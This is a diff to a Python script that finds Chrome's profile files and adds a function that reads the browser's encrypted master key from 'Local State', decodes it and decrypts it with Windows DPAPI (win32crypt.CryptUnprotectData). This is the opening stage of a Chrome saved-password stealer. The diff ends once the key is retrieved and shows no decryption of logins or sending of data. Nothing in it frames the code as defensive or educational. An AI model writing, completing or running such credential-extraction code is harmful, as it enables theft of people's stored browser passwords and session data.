@@ -2,11 +2,21 @@
 
 import sys
 import os
+#import syslog
+import json
+import base64
+import win32crypt
 
+class logger ():
+    #def logSysLog(status, action):
+        #syslog.syslog("System logged action: "+ status + ": " + action)
+
+    def logShell(status, action):
+        print(status + ": " + action)
 
 
 def determinePath():
-    if sys.platform == 'nt':
+    if sys.platform == 'win32':
         path = os.environ["USERPROFILE"] + "\\AppData\\Local\\Google\\Chrome\\User Data\\Local State"
         return path
     
@@ -18,10 +28,41 @@ def determinePath():
         path = "~/.config/google-chrome/Default/Login Data"
         return path
 
+def getEncryptionKey(path):
+    with open(path, "r", encoding="utf-8") as f:
+        data = json.loads(f.read())
+
+    #fetch key from data store based on path
+    key = base64.b64decode(data["os_crypt"]["encrypted_key"])
+    key = key[5:]
+
+    if sys.platform == 'win32':
+        return win32crypt.CryptUnprotectData(key, None, None, None, 0)[1]
+    else:
+        logger.logShell("Failure", "system is not Windows for getEncryptionKey function")
+
 
 def main():
     path = determinePath()
     print(path)
+
+    if os.path.exists(path):
+        logger.logShell("Success", "Chrome path successfully found")
+    else:
+        logger.logShell("Failure", "Chrome path not found. Chrome not installed, exiting...")
+        exit()
+
+    getEncryptionKey(path)
+    
+
+
+    
+
+
+
+
+
+    
 
 if __name__ == '__main__':
     main()
